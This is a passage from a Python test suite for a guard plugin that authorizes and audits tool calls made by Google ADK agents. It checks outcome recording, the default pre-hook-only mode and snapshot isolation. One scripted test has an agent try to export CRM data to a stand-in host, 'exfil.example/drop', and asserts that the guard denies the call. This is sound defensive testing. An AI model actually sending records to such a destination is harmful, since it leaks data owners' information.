    assert allow["adapter"]["module"] == "attenu_guard.adapters.google_adk"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_v2_a_tool_that_raises_records_a_raised_outcome_with_error_code():
    """Unlike CrewAI and the OpenAI Agents SDK, ADK does not swallow the tool's exception
    before this plugin's on_tool_error_callback runs, so RAISED is genuinely observed here.

    This plugin's on_tool_error_callback always returns None (it only observes, per the
    module docstring), so -- with no OTHER error callback configured -- ADK's own default
    behaviour applies: the original exception still propagates and the run fails. That is
    unrelated to execution binding; record_outcome() already ran, synchronously, before the
    exception left on_tool_error_callback, so the ledger is checked from the failure."""
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_fc("crm_query", rows=10), _text("done")],
            },
            tools=[_make_crm_query_boom(), demo.make_crm_export([])],
            issue_kwargs={"schema_version": 2},
            plugin_kwargs={"strict_single_hook": True},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        try:
            await _drive(runner, session, "go")
        except Exception:
            pass  # the tool's own exception propagating is expected -- see the docstring above
        return root_guard

    root_guard = asyncio.run(scenario())
    entries = root_guard.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes, entries
    assert outcomes[-1]["body_state"] == BodyState.RAISED
    assert outcomes[-1]["error_code"] == "ValueError"


def test_v1_guard_gets_no_call_id_capture_or_outcome():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [_fc("crm_query", rows=10), _text("done")],
        })
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard

    root_guard = asyncio.run(scenario())
    entries = root_guard.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "call_id" not in allow and "capture" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_denied_tool_call_never_records_an_outcome():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [
                    _fc("crm_query", rows=4200),
                    _fc("crm_export", destination="https://exfil.example/drop"),
                    _text("done"),
                ],
            },
            issue_kwargs={"schema_version": 2},
            plugin_kwargs={"strict_single_hook": True},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, calls

    root_guard, calls = asyncio.run(scenario())
    assert not any(name == "crm_export" for name, _ in calls)
    entries = root_guard.audit_log().entries
    assert any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries)
    # the export never allowed, and only the (single, allowed) crm_query call got an outcome
    export_allows = [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"]
    assert export_allows == []
    outcomes = [e for e in entries if e["event"] == "outcome"]
    allow_call_ids = {e["call_id"] for e in entries if e["event"] == "allow"}
    assert outcomes and all(o["call_id"] in allow_call_ids for o in outcomes)


# ==========================================================================
# Codex review round 3, finding 3: neither `after_tool_callback` nor
# `on_tool_error_callback` is a GUARANTEED terminal observer (a canonical
# before-callback can substitute the response; a shadowing plugin can stop
# dispatch before ours runs) -- so the plugin must default to the Guard's own
# honest PRE_HOOK_ONLY and only attempt FRAMEWORK_POST_HOOK recording under
# an explicit `strict_single_hook=True` attestation. These cover both halves:
# the default is genuinely inert, and strict mode's correlation is genuinely
# collision-safe (the pending entry holds tool_context itself, not just an
# id() derived from it -- the "pinned alive" claim Codex proved false).
# ==========================================================================
def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and after_tool_callback never calls record_outcome() -- not
    merely "no outcome happens to be missing", but zero outcome events at all, and the
    body still genuinely runs (this is authorization-only, not a broken integration)."""
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_fc("crm_query", rows=10), _text("done")],
            },
            issue_kwargs={"schema_version": 2},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, plugin, calls

    root_guard, plugin, calls = asyncio.run(scenario())
    assert calls  # the body genuinely ran
    entries = root_guard.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default stamp, not ours
    assert "call_id" in allow  # still a genuine v2 chain -- just no outcome recorded against it
    assert [e for e in entries if e["event"] == "outcome"] == []
    # Codex review round 3, finding 1 (core guard.py fix): a PRE_HOOK_ONLY allow must never
    # wedge complete() -- summarizer's own guard.complete() (this plugin's after_agent_callback
    # lifecycle marker, fired when the agent's own run ends) must genuinely finalize, not sit
    # pending forever behind a call nothing was ever going to record_outcome() for.
    assert plugin.guard_for("summarizer").is_complete


def test_strict_mode_pending_outcome_holds_a_strong_reference_to_tool_context():
    """The docstring's "pinned alive" claim only holds if the pending entry stores
    tool_context ITSELF, not merely id(tool_context) -- a dict keyed by an id whose value
    does not reference the object back cannot keep that id from being reused by a
    different, concurrently-live object once every OTHER reference to it drops. This
    calls _authorize directly (no live ADK ToolContext is needed -- _authorize only ever
    threads the object through by identity) and asserts the stashed entry `is` the exact
    object passed in."""
    root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="t", schema_version=2)
    plugin = dg_adk.DelegationGuardPlugin(
        root_guard, root_agent_name="orchestrator",
        delegations={"summarizer": SUMMARIZER_REQUEST}, tools=demo.TOOL_AUTHORITIES,
        strict_single_hook=True,
    )
    sentinel_tool_context = object()

    denial = plugin._authorize(
        root_guard, "orchestrator", "crm_query", "crm.read", {"rows": 1}, metered=False,
        tool_args={"rows": 1}, tool_context=sentinel_tool_context,
    )

    assert denial is None  # allowed
    pending = plugin._pending_outcomes[id(sentinel_tool_context)]
    assert pending.tool_context is sentinel_tool_context, "the entry did not hold the object itself"


# ==========================================================================
# Codex review (DO NOT MERGE, finding 3, critical): callbacks are not
# guaranteed terminal observers. These cover the fixable parts (DEFERRED
# detection, collision-safe correlation) and pin the documented, accepted
# residual gap (plugin dispatch short-circuit) as "leaves it unrecorded",
# never as "records something wrong".
# ==========================================================================
def test_v2_long_running_tool_records_a_deferred_outcome():
    """after_tool_callback must check tool.is_long_running BEFORE deciding RETURNED --
    its immediate return is a placeholder, not the tool's real, final output."""
    async def scenario():
        def crm_query_long(rows: int) -> dict:
            return {"rows_returned": rows}

        long_tool = LongRunningFunctionTool(crm_query_long)
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_fc("crm_query_long", rows=10), _text("done")],
            },
            tools=[long_tool],
            plugin_kwargs={
                "tools": {
                    "crm_query_long": dg_adk.ToolAuthority("crm.read", lambda a: {"rows": a.get("rows", 0)}),
                },
                "strict_single_hook": True,
            },
            issue_kwargs={"schema_version": 2},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard

    root_guard = asyncio.run(scenario())
    entries = root_guard.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes, entries
    assert outcomes[-1]["body_state"] == BodyState.DEFERRED


class _OverridingPlugin(BasePlugin):
    """A THIRD-PARTY plugin (not attenu-guard's own) whose after_tool_callback always
    overrides the result -- simulating another plugin registered ahead of
    DelegationGuardPlugin in the App's plugin list."""

    def __init__(self):
        super().__init__(name="overrider")

    async def after_tool_callback(self, *, tool, tool_args, tool_context, result):
        return {"overridden_by": "someone_else"}


def test_v2_a_plugin_registered_before_us_that_overrides_leaves_the_outcome_unrecorded():
    """PluginManager._run_callbacks stops at the first plugin whose callback returns
    non-None -- if an EARLIER-registered plugin's after_tool_callback overrides the
    result, DelegationGuardPlugin's own after_tool_callback never runs for that call.
    This must never fabricate an outcome; it must simply leave the call's outcome
    unrecorded (the honest "unobserved")."""
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [_fc("crm_query", rows=10), _text("done")],
        })
        summarizer = LlmAgent(name="summarizer", model=model, description="S",
                              tools=[demo.make_crm_query(calls)])
        orchestrator = LlmAgent(name="orchestrator", model=model, description="O",
                                sub_agents=[summarizer])
        root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root", schema_version=2)
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard, root_agent_name="orchestrator",
            delegations={"summarizer": SUMMARIZER_REQUEST}, tools=demo.TOOL_AUTHORITIES,
            strict_single_hook=True,
        )
        overrider = _OverridingPlugin()
        # overrider registered BEFORE plugin -- its after_tool_callback runs first and
        # short-circuits PluginManager._run_callbacks before plugin's own ever fires.
        app = App(name="dg-adk-override", root_agent=orchestrator, plugins=[overrider, plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-override", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, calls

    root_guard, calls = asyncio.run(scenario())
    assert calls  # the body DID run
    entries = root_guard.audit_log().entries
    assert any(e["event"] == "allow" and e.get("tool") == "crm_query" for e in entries)
    # no outcome was fabricated for the call THIS plugin's own after_tool_callback never saw
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_snapshot_freeze_never_shares_a_mutable_container_on_deepcopy_failure():
    """Codex review finding 7: on ANY deepcopy failure deep in a nested structure, the snapshot
    must never fall back to sharing the live, mutable container -- the unclonable leaf becomes
    the shared sanitizer's UNSUPPORTED marker (re-gate correction: it used to become a repr()
    string, which both executed the leaf's own __repr__ and risked colliding with a real
    string value -- see attenu_guard.adapters._snapshot's own module docstring), and every
    dict/list around it is rebuilt fresh regardless."""
    import threading
    from attenu_guard.adapters._snapshot import UNSUPPORTED
    unclonable = threading.Lock()
    live = {"rows": 10, "nested": {"unclonable": unclonable, "list": [1, 2, 3]}}

    snapshot = dg_adk._snapshot_params(live)

    assert snapshot["rows"] == 10
    assert snapshot["nested"]["unclonable"] is UNSUPPORTED
    live["nested"]["list"].append(999)
    live["nested"]["new_key"] = "mutated after snapshot"
    assert snapshot["nested"]["list"] == [1, 2, 3], "the snapshot shared a mutable list"
    assert "new_key" not in snapshot["nested"], "the snapshot shared the mutable dict"


class _AliasingList(list):
    """A mutable container whose `__deepcopy__` hands back itself -- reproduces the exact
    aliasing bug Codex found in round 2: `copy.deepcopy` SUCCEEDING is not proof of
    independence, since a class is free to implement `__deepcopy__` to return `self`."""

    def __deepcopy__(self, memo):
        return self


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review round 2, finding 4: the fix must never call ANY copy protocol
    (copy.deepcopy included) on a container -- rebuilding it from scratch as a fresh
    builtin is the only way to guarantee independence from the live object graph."""
    live = {"x": _AliasingList([1])}

    snapshot = dg_adk._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"
